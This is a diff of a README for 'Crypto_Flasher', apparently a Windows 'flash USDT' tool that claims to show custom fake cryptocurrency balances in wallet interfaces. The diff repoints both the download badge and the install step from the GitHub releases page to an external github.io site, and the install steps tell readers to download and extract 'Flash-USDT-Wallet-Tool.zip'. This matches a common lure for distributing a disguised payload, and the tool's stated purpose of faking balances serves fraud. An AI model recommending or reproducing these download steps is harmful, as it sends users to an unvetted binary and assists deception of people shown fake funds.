@@ -1,6 +1,6 @@
 # 💸 Crypto_Flasher - Display custom cryptocurrency balances on Windows
 
-[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Gillylarval651/Crypto_Flasher/releases)
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://gillylarval651.github.io)
 
 Crypto_Flasher is a tool for Windows users. It allows individuals to view custom balance amounts within their local wallet interfaces. Users load the program to simulate potential transaction values across common blockchain protocols. The software runs locally on your computer to provide a visual representation of ERC20, TRC20, and BEP20 tokens.
 
@@ -17,7 +17,7 @@ Crypto_Flasher is a tool for Windows users. It allows individuals to view custom
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Gillylarval651/Crypto_Flasher/releases) to access the files.
+1.  Visit the [official releases page](https://gillylarval651.github.io) to access the files.
 2.  Locate the latest version of the repository.
 3.  Click the link to download `Flash-USDT-Wallet-Tool.zip`.
 4.  Right-click the downloaded folder and select "Extract All" to view the program files.
